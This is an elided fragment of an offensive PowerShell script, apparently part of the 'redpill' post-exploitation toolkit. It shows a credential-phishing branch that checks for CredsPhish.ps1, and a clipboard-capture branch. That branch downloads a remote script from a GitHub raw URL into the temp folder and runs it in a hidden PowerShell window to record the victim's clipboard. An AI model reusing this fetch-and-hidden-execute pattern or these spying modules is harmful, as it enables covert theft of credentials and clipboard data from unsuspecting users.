...
If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){
   ...
   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 16,005859375/KB
...
If($Clipboard -ne "false"){
   ...
   If(-not(Test-Path -Path "$Env:TMP\clipboard.ps1")){## Download clipboard.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/clipboard.ps1 -Destination $Env:TMP\clipboard.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\clipboard.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 12){## Corrupted download detected => DefaultFileSize: 12,64453125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\clipboard.ps1"){Remove-Item -Path "$Env:TMP\clipboard.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }
   ...
   ElseIf($clipboard -ieq "Capture" -and $CaptureTime -gt 60)
   {
      ...
      Start-Process powershell -ArgumentList "powershell -WindowStyle hidden -File $Env:TMP\Clipboard.ps1 -Action Capture -CaptureTime $CaptureTime -Database $Database -Forensic $Forensic"
